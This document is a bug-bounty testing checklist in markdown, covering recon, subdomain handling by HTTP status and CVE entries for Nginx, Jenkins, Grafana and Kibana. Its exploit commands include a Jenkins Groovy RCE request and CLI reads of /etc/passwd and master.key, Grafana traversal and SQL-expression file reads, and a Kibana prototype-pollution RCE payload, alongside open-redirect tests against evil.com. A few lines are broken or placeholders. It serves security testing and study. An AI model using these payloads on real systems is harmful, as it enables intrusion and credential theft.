# Scope Types
<!-- categoryKey: scopes | icon: 🎯 | color: #c678dd -->
Checklists tailored to different bug bounty scope types — from massive FIS engagements to specific single-endpoint targets.

---

## Large Scope
<!-- id: large-scope | icon: 🎯 | color: #c678dd -->
Methodology for massive FIS-style scopes where all assets are in scope.

### Map the entire attack surface
<!-- id: scope-large-1 | severity: info | tags: large-scope, osint, recon -->
With 'Any FIS asset is in scope', discover ALL assets belonging to the organization via broad OSINT.

**Commands:**
```
amass intel -org 'Target Organization' -max 100
amass enum -d target.com -o amass-results.txt
subfinder -d target.com -silent | tee all-subs.txt
chaos -d target.com -silent | tee chaos-subs.txt
```

**References:**
- https://github.com/owasp-amass/amass
- https://github.com/projectdiscovery/chaos-client

### Find acquired/related companies
<!-- id: scope-large-2 | severity: info | tags: large-scope, acquisitions, osint -->
Large FIS scopes include all subsidiaries. Find forgotten assets from acquired companies.

**Commands:**
```
crtsh: Search target.com for related orgs via Issuer field
amass intel -whois -d target.com
Google dork: 'target.com | subsidiary'
```

### Scan all discovered IP ranges
<!-- id: scope-large-3 | severity: info | tags: large-scope, scanning, network -->
Massively scan all IP ranges belonging to the organization for open ports and services.

**Commands:**
```
mapcidr -l ip-ranges.txt -silent | naabu -rate 3000 -silent | httpx -silent
masscan -iL ip-ranges.txt -p 1-65535 --rate=10000 -oJ masscan.json
nmap -sV -sC -iL live-hosts.txt -oA nmap-scan
```

**References:**
- https://github.com/projectdiscovery/mapcidr
- https://github.com/projectdiscovery/naabu

---

## Medium Scope
<!-- id: medium-scope | icon: 🎯 | color: #c678dd -->
Methodology for *.target.com wildcard scopes with focused subdomain enumeration.

### Enumerate all subdomains of *.target.com
<!-- id: scope-medium-1 | severity: info | tags: medium-scope, subdomain-enum, recon -->
Use aggressive subdomain enumeration techniques to find every subdomain under the wildcard scope.

**Commands:**
```
subfinder -d target.com -all -silent | tee all-subs.txt
puredns bruteforce top-10000.txt target.com | tee brute-subs.txt
cat all-subs.txt brute-subs.txt | sort -u | httpx -silent | tee live.txt
```

**References:**
- https://github.com/projectdiscovery/subfinder

### Test subdomain takeovers
<!-- id: scope-medium-2 | severity: high | tags: medium-scope, takeover, subdomain -->
Check if any subdomains point to unclaimed external services that can be taken over.

**Commands:**
```
subjack -w all-subs.txt -t 50 -ssl -o takeovers.txt
subzy run --targets all-subs.txt
httpx -l all-subs.txt -status-code -cdn -silent | grep 'cloudfront\|s3\|github'
```

**References:**
- https://github.com/haccer/subjack
- https://github.com/LukaSikic/subzy

---

## Small Scope
<!-- id: small-scope | icon: 🎯 | color: #c678dd -->
Methodology for single-endpoint or narrow scopes requiring deep manual testing.

### Deep dive into single endpoint
<!-- id: scope-small-1 | severity: info | tags: small-scope, deep-dive, manual -->
With a single endpoint, focus on exhaustive testing of every feature and parameter.

**Commands:**
```
ffuf -u https://admin.target.com/FUZZ -w raft-large-directories.txt -t 50
ffuf -u https://admin.target.com/FUZZ -w raft-large-files.txt -t 50
katana -u https://admin.target.com -d 5 -silent | sort -u
```

### Exhaustive parameter testing
<!-- id: scope-small-2 | severity: medium | tags: small-scope, parameters, testing -->
Find and test every parameter the endpoint accepts. Test each for all vulnerability classes.

**Commands:**
```
arjun -u https://admin.target.com -t 20 -o params.json
x8 -u https://admin.target.com -w burp-parameter-names.txt -o params-found.txt
```

**References:**
- https://github.com/s0md3v/Arjun
- https://github.com/Sh1Yo/x8

### Authentication & session testing
<!-- id: scope-small-3 | severity: high | tags: small-scope, authentication, authorization -->
Focus on auth flaws: weak passwords, CSRF, JWT attacks, privilege escalation, and IDOR.

**Commands:**
```
jwt_tool https://admin.target.com/api/auth/token
curl -X POST https://admin.target.com/settings/update -d 'email=test@evil.com' -H 'Referer: https://evil.com'
curl https://admin.target.com/api/user/123 | curl https://admin.target.com/api/user/124
```

**References:**
- https://portswigger.net/web-security/authentication
- https://portswigger.net/web-security/access-control
# Subdomain Statuses
<!-- categoryKey: subdomains | icon: 🌐 | color: #61afef -->
Checklists for handling subdomains by their HTTP response status codes during reconnaissance.

---

## 403 Subdomains
<!-- id: 403-subdomains | icon: 🌐 | color: #61afef -->
Techniques to bypass 403 forbidden responses and access restricted areas.

### Bypass 403 with different HTTP methods
<!-- id: sub-403-1 | severity: medium | tags: 403, bypass, http-methods -->
Try alternative HTTP methods (POST, PUT, PATCH, OPTIONS) — some endpoints block GET but allow POST or PUT.

**Commands:**
```
curl -X POST https://target.com/admin/
curl -X PUT https://target.com/admin/
curl -X OPTIONS https://target.com/admin/
curl -X PATCH https://target.com/admin/
```

**References:**
- https://portswigger.net/web-security/access-control

### Bypass 403 with headers (X-Forwarded-For, X-Original-URL)
<!-- id: sub-403-2 | severity: medium | tags: 403, bypass, headers -->
Spoof internal IP addresses using common headers. Some proxies trust X-Forwarded-For for access decisions.

**Commands:**
```
curl -H 'X-Forwarded-For: 127.0.0.1' https://target.com/admin/
curl -H 'X-Original-URL: /admin/' https://target.com/
curl -H 'X-Rewrite-URL: /admin/' https://target.com/
curl -H 'X-Custom-IP-Authorization: 127.0.0.1' https://target.com/admin/
```

**References:**
- https://portswigger.net/web-security/access-control/security.txt

### Bypass 403 with path normalization
<!-- id: sub-403-3 | severity: medium | tags: 403, bypass, path-manipulation -->
Use path traversal characters, URL encoding, or double slashes to confuse access control rules.

**Commands:**
```
curl 'https://target.com/admin/..;/'
curl 'https://target.com/./admin/'
curl 'https://target.com//admin/'
curl 'https://target.com/Admin/'
curl 'https://target.com/%2fadmin/'
```

**References:**
- https://portswigger.net/web-security/access-control/path-traversal

---

## 404 Subdomains
<!-- id: 404-subdomains | icon: 🌐 | color: #61afef -->
Techniques to extract value from 404 responses and find hidden endpoints.

### Check 404 for hidden endpoints via fuzzing
<!-- id: sub-404-1 | severity: low | tags: 404, fuzzing, discovery -->
A 404 page might hide actual endpoints. Use directory brute-forcing to discover hidden resources.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

**References:**
- https://github.com/ffuf/ffuf

### Test 404 for custom error page information disclosure
<!-- id: sub-404-2 | severity: low | tags: 404, info-disclosure -->
Custom 404 pages may leak framework versions, server paths, or application internals.

**Commands:**
```
curl -s https://target.com/nonexistent123 | grep -i 'stack\|trace\|error\|version'
curl -sI https://target.com/nonexistent123
```

---

## 301 Subdomains
<!-- id: 301-subdomains | icon: 🌐 | color: #61afef -->
Techniques to analyze 301 redirects for information gathering and open redirects.

### Follow 301 redirects to find the final destination
<!-- id: sub-301-1 | severity: info | tags: 301, redirect, recon -->
301 redirects may point to different origins, exposing staging environments or internal services.

**Commands:**
```
curl -sI -L https://target.com | grep -i 'location\|host'
curl -sI https://target.com | grep -i location
```

### Check 301 for open redirect via header injection
<!-- id: sub-301-2 | severity: medium | tags: 301, open-redirect -->
Some redirects can be manipulated by injecting newlines or additional headers.

**Commands:**
```
curl -sI 'https://target.com/redirect?url=https://evil.com'
curl -sI 'https://target.com//evil.com/'
```

**References:**
- https://portswigger.net/web-security/ssrf

---

## 302 Subdomains
<!-- id: 302-subdomains | icon: 🌐 | color: #61afef -->
Techniques to test 302 redirects for OAuth bypasses and open redirect vulnerabilities.

### Check 302 redirect for parameter manipulation
<!-- id: sub-302-1 | severity: medium | tags: 302, open-redirect, parameter -->
302 redirects often take a 'url' or 'redirect' parameter that may be modifiable for open redirect.

**Commands:**
```
curl -sI 'https://target.com/login?redirect=https://evil.com'
curl -sI 'https://target.com/?next=https://evil.com'
curl -sI 'https://target.com/?returnUrl=https://evil.com'
```

**References:**
- https://portswigger.net/web-security/dom-based/open-redirect

### Test 302 for OAuth callback/redirect URI bypass
<!-- id: sub-302-2 | severity: high | tags: 302, oauth, bypass -->
OAuth flows often use 302 redirects with callback URIs that may accept open redirect bypasses.

**Commands:**
```
curl -sI 'https://target.com/auth/callback?redirect_uri=https://evil.com'
curl -sI 'https://target.com/auth/callback?redirect_uri=https://target.com.evil.com/'
```

**References:**
- https://portswigger.net/web-security/oauth

---

## 200 Subdomains
<!-- id: 200-subdomains | icon: 🌐 | color: #61afef -->
Techniques to thoroughly assess live subdomains returning 200 OK.

### Enumerate all endpoints on 200 subdomains
<!-- id: sub-200-1 | severity: info | tags: 200, enumeration, recon -->
Subdomains returning 200 are live. Thoroughly enumerate all directories, files, and APIs.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

### Check 200 subdomain for technology fingerprinting
<!-- id: sub-200-2 | severity: info | tags: 200, fingerprinting, recon -->
Identify technologies via headers, cookies, and page content to build an attack surface.

**Commands:**
```
curl -sI https://target.com | grep -i 'server\|x-powered-by\|set-cookie'
whatweb https://target.com
wappalyzer https://target.com
```

**References:**
- https://www.wappalyzer.com/

### Check 200 for sensitive files and misconfigurations
<!-- id: sub-200-3 | severity: high | tags: 200, sensitive-files, exposure -->
Look for exposed .git, .env, sitemap.xml, robots.txt, backup files, and admin panels.

**Commands:**
```
curl -s https://target.com/.git/config
curl -s https://target.com/.env
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
curl -s https://target.com/backup/
curl -s https://target.com/admin/
```

---

# Technologies
<!-- categoryKey: technologies | icon: 🛠️ | color: #e06c75 -->
Security checklists for common web technologies and infrastructure components.

---

## Nginx
<!-- id: nginx | icon: 🛠️ | color: #e06c75 -->
Security checklists for Nginx web server hardening and misconfiguration testing.

### Check Nginx version disclosure
<!-- id: nginx-1 | severity: low | tags: nginx, info-disclosure, hardening -->
Verify that Nginx isn't leaking version numbers in server headers or error pages.

**Commands:**
```
curl -I https://target.com | grep -i server
curl -I https://target.com/404 | grep -i nginx
```

**References:**
- https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens

### Test for Nginx alias traversal (CRLF & path traversal)
<!-- id: nginx-2 | severity: high | tags: nginx, path-traversal, misconfiguration -->
Misconfigured alias directives can lead to path traversal allowing access to files outside the intended root directory.

**Commands:**
```
curl -v 'https://target.com/assets../'
curl -v 'https://target.com/static../app.py'
```

**References:**
- https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

### Check for Nginx buffer overflow protections
<!-- id: nginx-3 | severity: medium | tags: nginx, buffer-overflow, hardening -->
Ensure client body buffer size and header buffer size limits are configured to prevent buffer overflow attacks.

**Commands:**
```
curl -v -H 'Host: '$(python3 -c 'print("A"*10000)')'' https://target.com
```

**References:**
- https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size

### CVE-2024-7347 — Buffer overread in ngx_http_mp4_module
<!-- id: nginx-cve-2024-7347 | severity: low | tags: nginx, cve, mp4-module, buffer-overread -->
Vulnerable: Nginx 1.5.13–1.27.0. The mp4 module has a buffer overread when processing specially crafted MP4 files. Upgrade to 1.27.1+ or 1.26.2+.

**Commands:**
```
curl -sI https://target.com | grep -i 'nginx' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+'
nginx -v 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7347

### CVE-2024-32760 / CVE-2024-31079 / CVE-2024-35200 / CVE-2024-34161 — HTTP/3 vulnerabilities
<!-- id: nginx-cve-2024-http3 | severity: medium | tags: nginx, cve, http3, buffer-overwrite, use-after-free -->
Vulnerable: Nginx 1.25.0–1.25.5 and 1.26.0. Multiple HTTP/3 issues including buffer overwrite, stack overflow, use-after-free, NULL pointer dereference, and memory disclosure. Upgrade to 1.27.0+ or 1.26.1+.

**Commands:**
```
curl --http3 https://target.com -v 2>&1 | head -5
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32760
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-31079
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35200

### CVE-2024-24989 / CVE-2024-24990 — NULL pointer and use-after-free in HTTP/3
<!-- id: nginx-cve-2024-24990 | severity: high | tags: nginx, cve, http3, use-after-free -->
CVE-2024-24989 (NULL pointer): Vulnerable 1.25.3 only. CVE-2024-24990 (use-after-free): Vulnerable 1.25.0–1.25.3. Both fixed in 1.25.4+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24990

### CVE-2022-41741 / CVE-2022-41742 — Memory corruption/disclosure in mp4 module
<!-- id: nginx-cve-2022-mp4 | severity: medium | tags: nginx, cve, mp4-module, memory-corruption -->
Vulnerable: Nginx 1.1.3–1.23.1 and 1.0.7–1.0.15. Memory corruption and disclosure via maliciously crafted MP4 file. Upgrade to 1.23.2+ or 1.22.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41741

### CVE-2021-23017 — 1-byte memory overwrite in resolver
<!-- id: nginx-cve-2021-23017 | severity: medium | tags: nginx, cve, resolver, memory-overwrite -->
Vulnerable: Nginx 0.6.18–1.20.0. Off-by-one error in DNS resolver allows a crafted DNS response to cause 1-byte memory overwrite, potentially leading to worker process crash or code execution. Upgrade to 1.21.0+ or 1.20.1+.

**Commands:**
```
// Check resolver config: grep -r 'resolver' /etc/nginx/
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23017

### CVE-2019-9511 / CVE-2019-9513 / CVE-2019-9516 — HTTP/2 DoS (Data Drown/Priority Flood)
<!-- id: nginx-cve-2019-http2 | severity: medium | tags: nginx, cve, http2, dos -->
Vulnerable: Nginx 1.9.5–1.17.2. Multiple HTTP/2 vulnerabilities leading to excessive CPU and memory usage. Upgrade to 1.17.3+ or 1.16.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9511
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9513

### CVE-2017-7529 — Integer overflow in range filter (info disclosure)
<!-- id: nginx-cve-2017-7529 | severity: medium | tags: nginx, cve, integer-overflow, info-disclosure -->
Vulnerable: Nginx 0.5.6–1.13.2. A specially crafted Range header causes an integer overflow allowing reading of cache file headers. Upgrade to 1.13.3+ or 1.12.1+.

**Commands:**
```
curl -H 'Range: bytes=-17208,-9223372036854758792' https://target.com/ -v
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7529

### CVE-2016-0742 / CVE-2016-0746 / CVE-2016-0747 — Resolver vulnerabilities
<!-- id: nginx-cve-2016-resolver | severity: medium | tags: nginx, cve, resolver, use-after-free -->
Vulnerable: Nginx 0.6.18–1.9.9. Invalid pointer dereference, use-after-free during CNAME processing, and insufficient CNAME resolution limits in the DNS resolver. Upgrade to 1.9.10+ or 1.8.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0742

### CVE-2013-4547 — Request line parsing (file extension bypass)
<!-- id: nginx-cve-2013-4547 | severity: medium | tags: nginx, cve, request-parsing, extension-bypass -->
Vulnerable: Nginx 0.8.41–1.5.6. A space in a URI before `.php` allows bypassing file extension restrictions and executing arbitrary files as PHP. Upgrade to 1.5.7+ or 1.4.4+.

**Commands:**
```
curl 'https://target.com/uploads/evil.jpg \0.php' -v
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547

### CVE-2013-2028 — Stack-based buffer overflow in chunked transfer
<!-- id: nginx-cve-2013-2028 | severity: high | tags: nginx, cve, buffer-overflow, rce -->
Vulnerable: Nginx 1.3.9–1.4.0. A specially crafted chunked request causes a stack-based buffer overflow allowing potential RCE. Upgrade to 1.5.0+ or 1.4.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2028

### CVE-2025-23419 — SSL session reuse cross-worker
<!-- id: nginx-cve-2025-23419 | severity: medium | tags: nginx, cve, ssl, session-reuse -->
Vulnerable: Nginx 1.11.4–1.27.3. In multi-worker configurations with TLS session cache, clients can reuse SSL sessions from different server blocks, potentially bypassing client certificate authentication. Upgrade to 1.27.4+ or 1.26.3+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23419

---

## Jenkins
<!-- id: jenkins | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jenkins CI/CD server hardening and vulnerability testing.

### Check for unauthenticated Jenkins access
<!-- id: jenkins-1 | severity: critical | tags: jenkins, unauthorized-access, critical -->
Jenkins instances without authentication expose jobs, build logs, and credentials.

**Commands:**
```
curl -s https://target.com:8080/script
curl -s https://target.com:8080/api/json
```

**References:**
- https://www.jenkins.io/doc/book/security/securing-jenkins/

### Check Jenkins script console (RCE)
<!-- id: jenkins-2 | severity: critical | tags: jenkins, rce, critical -->
The Jenkins script console (/script) allows execution of arbitrary Groovy code.

**Commands:**
```
curl -s https://target.com:8080/script
curl -s https://target.com:8080/scriptText
```

**References:**
- https://www.jenkins.io/doc/book/managing/script-console/

### Test Jenkins credential leakage via build logs
<!-- id: jenkins-3 | severity: high | tags: jenkins, credential-leakage, high -->
Build logs often contain plaintext credentials, API keys, or tokens.

**Commands:**
```
curl -s https://target.com:8080/job/<job-name>/lastBuild/consoleText
```

**References:**
- https://www.jenkins.io/doc/book/using/using-credentials/

### CVE-2018-1000861 — Unauthenticated RCE via Stapler routing
<!-- id: jenkins-cve-2018-1000861 | severity: critical | tags: jenkins, cve, rce, stapler, unauthenticated -->
Vulnerable: Jenkins Core prior to 2.138.2 (LTS) and 2.153 (weekly). Unauthenticated attackers can invoke crafted URLs to reach restricted methods in Jenkins objects via the Stapler web framework, leading to Remote Code Execution.

**Commands:**
```
curl -X POST https://target.com:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile -d 'value=throw+new+Exception("id".execute().text)'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000861
- https://www.jenkins.io/security/advisory/2018-12-05/

### CVE-2019-1003000 / CVE-2019-1003001 — Groovy sandbox bypass RCE (Script Security + Pipeline)
<!-- id: jenkins-cve-2019-1003000 | severity: critical | tags: jenkins, cve, rce, groovy-sandbox, pipeline -->
Vulnerable: Script Security plugin prior to 1.50, Pipeline: Groovy plugin prior to 2.61. Authenticated users with limited permissions can bypass the Groovy sandbox and execute arbitrary code on the Jenkins master via crafted pipeline scripts.

**Commands:**
```
// In a pipeline script:
@Grab('org.apache.commons:commons-collections:3.1')
import org.apache.commons.collections.*
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1003000
- https://www.jenkins.io/security/advisory/2019-01-08/

### CVE-2016-0792 — Java deserialization RCE via CLI (pre-auth)
<!-- id: jenkins-cve-2016-0792 | severity: critical | tags: jenkins, cve, rce, deserialization, cli -->
Vulnerable: Jenkins Core prior to 1.650 and 1.642.2 LTS. Unauthenticated attackers can send a crafted serialized Java object via the Jenkins CLI to achieve Remote Code Execution on the server.

**Commands:**
```
java -jar jenkins-cli.jar -s https://target.com:8080/ who-am-i
// Send crafted ysoserial payload via CLI transport
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0792
- https://www.jenkins.io/security/advisory/2016-02-24/

### CVE-2023-27898 / CVE-2023-27905 — XSS/CSRF in update center (XSS via plugin)
<!-- id: jenkins-cve-2023-27898 | severity: high | tags: jenkins, cve, xss, csrf, update-center -->
Vulnerable: Jenkins Core prior to 2.394 and 2.375.4 LTS, Update Center 2 prior to YYYYMMDD. A malicious plugin site can deliver crafted content that triggers stored XSS and CSRF in the Jenkins update center UI, leading to full Jenkins takeover.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27898
- https://www.jenkins.io/security/advisory/2023-03-08/

### CVE-2024-43044 — Arbitrary file read via agent-to-controller class loading (critical)
<!-- id: jenkins-cve-2024-43044 | severity: critical | tags: jenkins, cve, file-read, agent-controller -->
Vulnerable: Jenkins Core prior to 2.471 and 2.452.4 LTS. Jenkins agents can request class loading from the controller, and the ClassLoaderProxy does not restrict which files are served — allowing a compromised agent to read arbitrary files from the Jenkins controller filesystem, including secrets.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-43044
- https://www.jenkins.io/security/advisory/2024-08-07/

### CVE-2024-23897 — Arbitrary file read via Jenkins CLI (unauthenticated)
<!-- id: jenkins-cve-2024-23897 | severity: critical | tags: jenkins, cve, file-read, cli, unauthenticated -->
Vulnerable: Jenkins Core prior to 2.441 and 2.426.3 LTS. The CLI command parser replaces @ symbols with file contents in arguments. Unauthenticated attackers can read arbitrary files from the Jenkins server filesystem including /etc/passwd and credentials.xml.

**Commands:**
```
java -jar jenkins-cli.jar -s https://target.com:8080/ help "@/etc/passwd"
java -jar jenkins-cli.jar -s https://target.com:8080/ help "@/var/jenkins_home/secrets/master.key"
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23897
- https://www.jenkins.io/security/advisory/2024-01-24/

### CVE-2022-34177 — Arbitrary file write via Pipeline input step
<!-- id: jenkins-cve-2022-34177 | severity: high | tags: jenkins, cve, file-write, pipeline, path-traversal -->
Vulnerable: Pipeline: Input Step plugin prior to 448.v37cea_9a_10a_70. The input step writes submitted files without sanitizing the filename, allowing path traversal and arbitrary file write on the Jenkins controller.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34177
- https://www.jenkins.io/security/advisory/2022-06-22/

### CVE-2021-21685 to CVE-2021-21694 — Agent-to-controller security bypass (bulk)
<!-- id: jenkins-cve-2021-agent | severity: critical | tags: jenkins, cve, agent-controller, security-bypass, rce -->
Vulnerable: Jenkins Core prior to 2.319 and 2.303.3 LTS. Multiple agent-to-controller security bypass vulnerabilities allow malicious build agents to read/write arbitrary files on the Jenkins controller and execute code, effectively achieving full controller compromise from a compromised agent.

**References:**
- https://www.jenkins.io/security/advisory/2021-11-04/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21685

---

## Grafana
<!-- id: grafana | icon: 🛠️ | color: #e06c75 -->
Security checklists for Grafana monitoring dashboard hardening.

### Check for unauthenticated Grafana dashboard access
<!-- id: grafana-1 | severity: high | tags: grafana, unauthorized-access, info-disclosure -->
Default Grafana installs may allow public access to dashboards.

**Commands:**
```
curl -s https://target.com:3000/api/search?type=dash-db
curl -s https://target.com:3000/dashboards
```

**References:**
- https://grafana.com/docs/grafana/latest/administration/security/

### Check Grafana API key exposure
<!-- id: grafana-2 | severity: high | tags: grafana, api-key, credential-leakage -->
Grafana API keys in config files can be leaked via SSRF or file read vulnerabilities.

**Commands:**
```
curl -s https://target.com:3000/api/admin/stats
curl -s https://target.com:3000/api/org
```

**References:**
- https://grafana.com/docs/grafana/latest/administration/api-keys/

### Check for Grafana directory traversal (CVE-2021-43798)
<!-- id: grafana-3 | severity: critical | tags: grafana, path-traversal, cve -->
Older Grafana versions (< 8.3.1) are vulnerable to directory traversal via plugin asset URLs.

**Commands:**
```
curl --path-as-is 'https://target.com:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798

### CVE-2024-9264 — Remote Code Execution in SQL Expressions (Critical, CVSS 9.4)
<!-- id: grafana-cve-2024-9264 | severity: critical | tags: grafana, cve, rce, sql-expressions -->
Vulnerable: Grafana 11.0.x prior to 11.0.5, 11.1.x prior to 11.1.6, 11.2.x prior to 11.2.1. The SQL Expressions feature allows execution of DuckDB queries that can be exploited to run OS commands on the server. The feature is disabled by default; enabled instances are critically vulnerable.

**Commands:**
```
curl -s -X POST https://target.com:3000/api/ds/query -H 'Content-Type: application/json' -d '{"queries":[{"datasource":{"type":"__expr__"},"type":"sql","sql":"SELECT * FROM read_csv_auto(\"/etc/passwd\")"}]}'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9264

### CVE-2023-3128 — Authentication Bypass in Azure AD OAuth (Critical, CVSS 9.4)
<!-- id: grafana-cve-2023-3128 | severity: critical | tags: grafana, cve, auth-bypass, azure-ad, oauth -->
Vulnerable: Grafana 6.7.0–10.0.1 when using Azure AD OAuth with allowed groups configured. An attacker with a different Microsoft tenant account can bypass group verification and authenticate as any user whose email address matches — leading to full account takeover without requiring the target's password.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3128

### CVE-2022-39328 — Race Condition in Authentication (Critical, CVSS 9.8)
<!-- id: grafana-cve-2022-39328 | severity: critical | tags: grafana, cve, race-condition, authentication -->
Vulnerable: Grafana 9.2.x prior to 9.2.4. A race condition in the authentication flow allows an unauthenticated attacker to authenticate as a randomly selected logged-in user under high-traffic conditions.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39328

### CVE-2022-31107 — Account Takeover in OAuth (High, CVSS 7.1)
<!-- id: grafana-cve-2022-31107 | severity: high | tags: grafana, cve, oauth, account-takeover -->
Vulnerable: Grafana 5.3.0–9.0.2. When OAuth is configured, an attacker who controls an OAuth provider account can take over a Grafana account if the target Grafana user's login name matches the attacker's OAuth username — even across different OAuth providers.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31107

### CVE-2022-21673 — Token Leakage in OAuth Redirect (Medium)
<!-- id: grafana-cve-2022-21673 | severity: medium | tags: grafana, cve, oauth, token-leakage -->
Vulnerable: Grafana 7.4.0–8.3.3. Forward auth proxy mode leaks the OAuth access token to the data source plugin via the X-Ds-Access-Token header, which could be logged by the plugin backend.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21673

### CVE-2025-11539 — Arbitrary Code Execution in Image Renderer Plugin (Critical, CVSS 9.9)
<!-- id: grafana-cve-2025-11539 | severity: critical | tags: grafana, cve, rce, image-renderer, plugin -->
Vulnerable: Grafana Image Renderer Plugin prior to 3.11.7. The plugin does not properly sanitize arguments to the Chrome browser headless process, allowing authenticated users to execute arbitrary OS commands on the server by injecting flags into dashboard/panel rendering requests.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11539

---

## Kibana
<!-- id: kibana | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kibana analytics dashboard hardening.

### Check for unauthenticated Kibana access
<!-- id: kibana-1 | severity: high | tags: kibana, unauthorized-access, info-disclosure -->
Kibana may expose Elasticsearch data without authentication.

**Commands:**
```
curl -s https://target.com:5601/api/status
curl -s https://target.com:5601/app/kibana
```

**References:**
- https://www.elastic.co/guide/en/kibana/current/security.html

### Check for Kibana prototype pollution (CVE-2019-7609)
<!-- id: kibana-2 | severity: critical | tags: kibana, rce, cve -->
Kibana versions < 6.6.1 are vulnerable to prototype pollution leading to RCE.

**Commands:**
```
curl -s https://target.com:5601/api/timelion/functions
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7609

### Check Kibana for Elasticsearch data leakage
<!-- id: kibana-3 | severity: high | tags: kibana, data-leakage, misconfiguration -->
If Kibana has weak index permissions, attackers may access sensitive Elasticsearch indices.

**Commands:**
```
curl -s https://target.com:5601/api/saved_objects/_find?type=index-pattern
```

**References:**
- https://www.elastic.co/guide/en/kibana/current/xpack-security-authorization.html

### CVE-2019-7609 — Prototype pollution RCE via Timelion (Critical)
<!-- id: kibana-cve-2019-7609 | severity: critical | tags: kibana, cve, rce, prototype-pollution, timelion -->
Vulnerable: Kibana 5.0.0–5.6.14 and 6.0.0–6.6.0. The Timelion chart engine evaluates user-provided expressions using a JavaScript interpreter vulnerable to prototype pollution, leading to RCE. Upgrade to 6.6.1+.

**Commands:**
```
curl -X POST https://target.com:5601/api/timelion/run -H 'Content-Type: application/json' -d '{"sheet":[".es(*).props(label.__proto__.env.AAAA=\'require(\"child_process\").__proto__.constructor(\"return process\")().mainModule.require(\"child_process\")\')"],"time":{"from":"now-1h","to":"now","mode":"quick","interval":"auto","timezone":"UTC"}}'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7609

### CVE-2021-22150 — Arbitrary code execution via Timelion (High)
<!-- id: kibana-cve-2021-22150 | severity: high | tags: kibana, cve, rce, timelion -->
Vulnerable: Kibana 7.0.0–7.12.0. Authenticated users with access to Timelion can execute arbitrary code on the Kibana server via crafted Timelion expressions. Upgrade to 7.12.1+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22150

---

## Apache HTTP Server
<!-- id: apache-httpd | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache HTTP Server hardening and misconfiguration testing.

### Check for exposed server-status and server-info pages
<!-- id: apache-1 | severity: medium | tags: apache, info-disclosure, misconfiguration -->
Apache mod_status (/server-status) and mod_info (/server-info) expose active requests, worker status, and configuration details when not restricted to localhost.

**References:**
- https://httpd.apache.org/docs/current/mod/mod_status.html

### Check for directory listing enabled
<!-- id: apache-2 | severity: medium | tags: apache, directory-listing, misconfiguration -->
Apache with `Options Indexes` enabled lists directory contents, potentially exposing source code, backup files, and sensitive configuration files.

**References:**
- https://httpd.apache.org/docs/current/mod/mod_autoindex.html

### Check for Apache mod_cgi shellshock exposure (CVE-2014-6271)
<!-- id: apache-3 | severity: critical | tags: apache, shellshock, rce, cve -->
Apache servers with mod_cgi or mod_cgid enabled and CGI scripts present may be vulnerable to the Shellshock bash vulnerability via HTTP headers.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

---

## Apache Tomcat
<!-- id: apache-tomcat | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Tomcat application server hardening and exploitation testing.

